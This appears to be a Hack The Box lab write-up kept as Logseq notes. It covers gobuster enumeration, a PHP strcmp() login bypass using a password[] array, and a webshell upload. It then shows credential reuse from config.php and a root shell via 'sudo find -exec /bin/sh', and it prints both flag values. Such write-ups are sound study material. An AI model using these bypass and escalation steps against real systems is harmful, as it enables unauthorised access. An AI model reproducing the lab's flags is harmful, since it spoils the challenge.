public:: true
tags:: password reuse, code review, sudo

- Open ports
	- TCP
		- ```
		  22/tcp
		  80/tcp
		  ```
- Generate the webroot tree
	- via `burp`
		- ```
		  # Show only folders
		  /
		  ├── assets
		  ├── forms
		  ├── icons
		  └── login
		  ```
		  Not that useful after all
	- via `gobuster`
		- id:: 65549612-54e8-4546-94bb-09b5b63ee0fd
		  ```bash
		  gobuster dir -w /usr/share/dirb/wordlists/big.txt -t 4 -u "http://10.129.31.0"
		  ===============================================================
		  Starting gobuster in directory enumeration mode
		  ===============================================================
		  /.htaccess            (Status: 403) [Size: 276]
		  /.htpasswd            (Status: 403) [Size: 276]
		  /_uploaded            (Status: 301) [Size: 314] [--> http://10.129.31.0/_uploaded/]
		  /assets               (Status: 301) [Size: 311] [--> http://10.129.31.0/assets/]
		  /forms                (Status: 301) [Size: 310] [--> http://10.129.31.0/forms/]
		  /login                (Status: 301) [Size: 310] [--> http://10.129.31.0/login/]
		  /server-status        (Status: 403) [Size: 276]
		  Progress: 20469 / 20470 (100.00%)
		  ```
		  `http://10.129.31.0/_uploaded/` is good finding, it will become useful later.
- OpenSSH version is `OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)`
	- At first look I thought I may have been vulnerable to user enumeration ([CVE-2018-15473](https://nvd.nist.gov/vuln/detail/CVE-2018-15473)). But giving a better look at the [Ubuntu SA](https://ubuntu.com/security/CVE-2018-15473) it's clear it is not.
- The web-server allows directory listing and `http://10.129.31.0/login/` shows a file named `login.php.swp`.
  This allow us to give a look at the source code of a portion of `login.php`
	- The login form seems to use a weak `strcmp()` condition for the password field.
		- ```php
		          if (strcmp($password, $_POST['password']) == 0) {
		      if (strcmp($username, $_POST['username']) == 0) {
		      require('config.php');
		  if (!empty($_POST['username']) && !empty($_POST['password'])) {
		  ```
		- A quick google search for `strcmp php exploit` returns many [blog posts](https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016) explaining how this function is poorly implemented in php.
		- If I set `$_POST[‘password’]` equal to an empty array, then `strcmp()` would return a NULL. Due to some inherent weaknesses in PHP’s comparisons, `NULL == 0` will return `true`. More info [here](http://www.dimuthu.org/blog/2008/10/31/triple-equal-operator-and-null-in-php/).
		- With `burp` we can intercept the login request and change the `password` field into an empty array
		  ```
		  http://10.129.31.0/login/login.php?username=admin&password[]=%22%22
		  ```
		  This grant us access to the admin panel, which in turn has an upload for where we can upload a webshell. We know where the it got uploaded thanks to [`gobuster`](logseq://graph/HTB-Notes?block-id=65549612-54e8-4546-94bb-09b5b63ee0fd).
- Now that we successfully bypassed the authentication and uploaded our webshell, we can start hunting for loots.
	- Lets retrieve valid usernames
	  ```bash
	  > id
	  uid=33(www-data) gid=33(www-data) groups=33(www-data)
	  > ls /home
	  john
	  ```
	- Search for interesting readable files
	  ```bash
	  > cat config.php
	  <?php
	  $username = "admin";
	  $password = "thisisagoodpassword";
	  [...]
	  ```
	- We can access SSH with the user `john` and the found password thanks to password reusing.
		- **User flag** at `/home/john/user.txt`
			- f54846c258f3b4612f78a819573d158e
			  background-color:: green
		- Lets check if `john` can run some commands as `root` via `sudo`
		  ```bash
		  john@base:~$ sudo -l
		  [sudo] password for john:
		  Matching Defaults entries for john on base:
		      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
		  
		  User john may run the following commands on base:
		      (root : root) /usr/bin/find
		  ```
		  We can run `find` as the user `root`.
		- ### Privesc
			- Lets make `find` drop a shell for us
			  ```bash
			  john@base:~$ sudo find . -name .bashrc -exec /bin/sh \;
			  # id
			  uid=0(root) gid=0(root) groups=0(root)
			  ```
			- **Root flag** at `/root/root.txt`
				- 51709519ea18ab37dd6fc58096bea949
				  background-color:: green